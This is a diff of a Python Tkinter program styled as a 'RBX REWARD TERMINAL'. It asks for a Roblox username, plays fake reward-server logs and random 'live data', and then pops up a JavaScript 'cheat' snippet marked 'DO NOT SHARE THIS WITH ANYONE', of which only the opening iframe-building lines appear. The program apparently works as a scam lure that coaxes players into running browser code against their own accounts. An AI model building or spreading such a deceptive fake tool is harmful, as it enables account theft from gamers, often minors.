@@ -34,7 +34,6 @@ title = tk.Label(
     bg=BG,
     font=("Consolas", 34, "bold")
 )
-
 title.pack(pady=30)
 
 subtitle = tk.Label(
@@ -44,7 +43,6 @@ subtitle = tk.Label(
     bg=BG,
     font=("Consolas", 14)
 )
-
 subtitle.pack()
 
 user_label = tk.Label(
@@ -54,7 +52,6 @@ user_label = tk.Label(
     bg=BG,
     font=("Consolas", 13)
 )
-
 user_label.pack(pady=(40, 5))
 
 user_entry = tk.Entry(
@@ -66,7 +63,6 @@ user_entry = tk.Entry(
     font=("Consolas", 14),
     relief="flat"
 )
-
 user_entry.pack(ipady=6)
 
 pass_label = tk.Label(
@@ -76,7 +72,6 @@ pass_label = tk.Label(
     bg=BG,
     font=("Consolas", 13)
 )
-
 pass_label.pack(pady=(20, 5))
 
 pass_entry = tk.Entry(
@@ -89,7 +84,6 @@ pass_entry = tk.Entry(
     font=("Consolas", 14),
     relief="flat"
 )
-
 pass_entry.pack(ipady=6)
 
 status_label = tk.Label(
@@ -99,7 +93,6 @@ status_label = tk.Label(
     bg=BG,
     font=("Consolas", 12)
 )
-
 status_label.pack(pady=15)
 
 # =========================================================
@@ -115,7 +108,6 @@ header = tk.Label(
     bg=BG,
     font=("Consolas", 28, "bold")
 )
-
 header.pack(pady=20)
 
 menu = tk.Label(
@@ -133,7 +125,6 @@ menu = tk.Label(
     justify="left",
     font=("Consolas", 15)
 )
-
 menu.pack()
 
 terminal = tk.Text(
@@ -146,7 +137,6 @@ terminal = tk.Text(
     highlightthickness=1,
     highlightbackground=RED
 )
-
 terminal.pack(fill="both", expand=True, padx=25, pady=25)
 
 # =========================================================
@@ -154,22 +144,16 @@ terminal.pack(fill="both", expand=True, padx=25, pady=25)
 # =========================================================
 
 def write(text, delay=0.02):
-
     terminal.insert("end", text + "\n")
     terminal.see("end")
-
     root.update()
-
     time.sleep(delay)
 
 def random_ip():
-
     return ".".join(str(random.randint(1, 255)) for _ in range(4))
 
 def random_token(length=24):
-
     chars = string.ascii_uppercase + string.digits
-
     return "".join(random.choice(chars) for _ in range(length))
 
 # =========================================================
@@ -177,7 +161,6 @@ def random_token(length=24):
 # =========================================================
 
 logs = [
-
     "CONNECTING TO REWARD SERVERS...",
     "VERIFYING ACCOUNT STATUS...",
     "SCANNING PENDING BALANCE...",
@@ -197,36 +180,24 @@ logs = [
 # =========================================================
 
 def side_window():
-
     win = tk.Toplevel(root)
-
     win.title("LIVE DATA")
     win.geometry("400x250+20+20")
     win.configure(bg=BG)
 
-    txt = tk.Text(
-        win,
-        bg=BG,
-        fg=RED,
-        font=("Consolas", 9),
-        borderwidth=0
-    )
-
+    txt = tk.Text(win, bg=BG, fg=RED, font=("Consolas", 9), borderwidth=0)
     txt.pack(fill="both", expand=True)
 
     chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
     while True:
-
         line = "".join(random.choice(chars) for _ in range(55))
-
         try:
             txt.insert("end", line + "\n")
             txt.see("end")
             win.update()
         except:
             break
-
         time.sleep(0.03)
 
 # =========================================================
@@ -234,7 +205,6 @@ def side_window():
 # =========================================================
 
 def run_terminal():
-
     threading.Thread(target=side_window, daemon=True).start()
 
     for i in range(100):
@@ -266,7 +236,7 @@ def run_terminal():
 
     messagebox.showinfo(
         "RBX REWARD TERMINAL",
-        "DO NOT SHARE THIS WITH ANYONE\n\n(() => {
+        "WARNING: DO NOT SHARE THIS WITH ANYONE\n\n(() => {
     const cheat = async () => {
         let i = document.createElement('iframe');
         document.body.append(i);
@@ -305,6 +275,59 @@ def run_terminal():
     )
 
 # =========================================================
+# ROBLOX USERNAME POPUP
+# =========================================================
+
+def ask_roblox_username():
+
+    popup = tk.Toplevel(root)
+    popup.title("ROBLOX USERNAME")
+    popup.geometry("400x200")
+    popup.configure(bg=BG)
+
+    label = tk.Label(
+        popup,
+        text="ENTER ROBLOX USERNAME",
+        fg=RED,
+        bg=BG,
+        font=("Consolas", 14)
+    )
+    label.pack(pady=20)
+
+    rbx_entry = tk.Entry(
+        popup,
+        bg="#111111",
+        fg=RED,
+        insertbackground=RED,
+        font=("Consolas", 14),
+        relief="flat"
+    )
+    rbx_entry.pack(ipady=6)
+
+    def submit():
+        username = rbx_entry.get()
+
+        popup.destroy()
+
+        main_frame.pack(fill="both", expand=True)
+
+        write(f"WELCOME {username}")
+        write("INITIALIZING TERMINAL...")
+
+        threading.Thread(target=run_terminal, daemon=True).start()
+
+    btn = tk.Button(
+        popup,
+        text="ENTER",
+        command=submit,
+        bg="#111111",
+        fg=RED,
+        relief="flat",
+        font=("Consolas", 12)
+    )
+    btn.pack(pady=20)
+
+# =========================================================
 # LOGIN FUNCTION
 # =========================================================
 
@@ -316,13 +339,9 @@ def login():
     if username == SYSTEM_USER and password == SYSTEM_PASS:
 
         login_frame.pack_forget()
-
-        main_frame.pack(fill="both", expand=True)
-
-        threading.Thread(target=run_terminal, daemon=True).start()
+        ask_roblox_username()
 
     else:
-
         status_label.config(text="ACCESS DENIED")
 
 # =========================================================
@@ -342,7 +361,6 @@ login_btn = tk.Button(
     padx=20,
     pady=10
 )
-
 login_btn.pack(pady=25)
 
 # =========================================================
